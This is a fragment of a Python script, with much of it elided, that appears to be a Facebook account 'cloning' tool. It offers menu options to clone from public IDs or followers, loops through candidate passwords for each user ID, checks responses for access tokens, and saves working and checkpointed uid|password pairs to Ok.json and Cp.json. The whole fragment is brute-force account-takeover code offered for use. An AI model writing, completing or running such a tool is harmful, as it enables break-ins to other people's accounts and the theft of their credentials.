...
def __login__():
	...
	print('[3] Out')
		...
		print('[•] Please Wait contacting With Athur')
                time.sleep(3)
...
def __menu__():
	...
	print('\n[1] Cloning From Public ID')
	print('[2] Cloning From Follower')
	print('[3] Check Ok Cp Ids')
	print('[0] Out')
	msk = raw_input('\n[#] Choose : ')
	if msk == "":
		exit('[•] Wrong Input')
		...
		try:
			...
			for pw in pwx:
				...
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r\033[1;92m[Baloch_Ok] '+uid+'|'+pw+'        '
					ok.append(uid+'|'+pw)
					save = open('Ok.json','a') 
					...
					print '\r\033[1;93m[Baloch_Cp] '+uid+' |'+pw+' |'+nama
					cp.append(uid+'|'+pw)
					save = open('Cp.json','a')
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
